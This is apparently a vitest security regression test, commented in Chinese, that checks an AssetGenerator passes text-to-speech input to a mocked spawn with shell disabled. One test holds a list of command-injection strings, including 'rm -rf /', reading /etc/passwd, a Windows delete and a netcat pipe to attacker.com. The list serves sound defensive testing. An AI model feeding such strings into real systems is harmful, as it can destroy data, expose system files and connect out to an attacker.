// @ts-check
/**
 * AssetGenerator 安全回归测试 (P0-1)
 *
 * 验证命令注入漏洞已修复：
 *   - spawn 调用必须使用 shell: false
 *   - 恶意文本不能触发任意 shell 命令
 */
// vitest 全局注入 vi, describe, it, expect, beforeEach — 无需 require

const { EventEmitter } = require('events')

// 用 vi.fn 创建 mock spawn，捕获调用参数
const mockSpawn = vi.fn((cmd, args, opts) => {
  const proc = new EventEmitter()
  setTimeout(() => proc.emit('exit', 1), 0)
  return proc
})

// 项目 test-setup.js 的 __registerMock 通过 Module._load 拦截 CJS require
__registerMock('child_process', {
  spawn: mockSpawn,
  execFile: vi.fn((cmd, args, opts, cb) => {
    if (typeof opts === 'function') cb = opts
    else if (typeof cb !== 'function') cb = () => {}
    cb(new Error('mocked'))
  }),
  execSync: vi.fn(() => ''),
})

__registerMock('fs', {
  existsSync: vi.fn(() => false),
  mkdirSync: vi.fn(),
  statSync: vi.fn(() => ({ size: 1024 })),
})

const { AssetGenerator } = require('./asset-generator')

// 辅助：从 mockSpawn.mock.calls 中找 python 调用
function findPythonSpawn() {
  const call = mockSpawn.mock.calls.find(c => c[0] === 'python')
  return call ? { cmd: call[0], args: call[1], opts: call[2] } : undefined
}

describe('AssetGenerator P0-1: command injection prevention', () => {
  beforeEach(() => { mockSpawn.mockClear() })

  it('spawn must use shell: false (not shell: true)', async () => {
    const gen = new AssetGenerator({ outputDir: '/tmp/test' })
    await gen.generateTTS('hello world', { index: 0 })
    const ttsSpawn = findPythonSpawn()
    expect(ttsSpawn).toBeDefined()
    expect(ttsSpawn.opts.shell).toBe(false)
  })

  it('malicious shell metacharacters are passed as args, not executed', async () => {
    const gen = new AssetGenerator({ outputDir: '/tmp/test' })
    const maliciousInputs = [
      '"; rm -rf / #',
      '$(whoami)',
      'a && del /F /Q C:\\',
      '`; cat /etc/passwd #',
      '| nc attacker.com 4444',
    ]
    for (const text of maliciousInputs) {
      mockSpawn.mockClear()
      await gen.generateTTS(text, { index: 0 })
      const ttsSpawn = findPythonSpawn()
      expect(ttsSpawn).toBeDefined()
      // 验证恶意文本作为数组参数原样传递，而非被 shell 解释
      expect(ttsSpawn.args).toContain(text)
      expect(ttsSpawn.opts.shell).toBe(false)
    }
  })

  it('cleanText is sliced to 200 chars before passing to spawn', async () => {
    const gen = new AssetGenerator({ outputDir: '/tmp/test' })
    const longText = 'a'.repeat(500)
    await gen.generateTTS(longText, { index: 0 })
    const ttsSpawn = findPythonSpawn()
    expect(ttsSpawn).toBeDefined()
    const passedText = ttsSpawn.args.find(a => typeof a === 'string' && a.length === 200)
    expect(passedText).toBeDefined()
    expect(passedText.length).toBe(200)
  })

  it('empty text falls back to silence (no spawn call to python)', async () => {
    const gen = new AssetGenerator({ outputDir: '/tmp/test' })
    mockSpawn.mockClear()
    await gen.generateTTS('', { index: 0 })
    const pythonSpawn = findPythonSpawn()
    // 空文本应直接返回 null，不调用 python
    expect(pythonSpawn).toBeUndefined()
  })
})
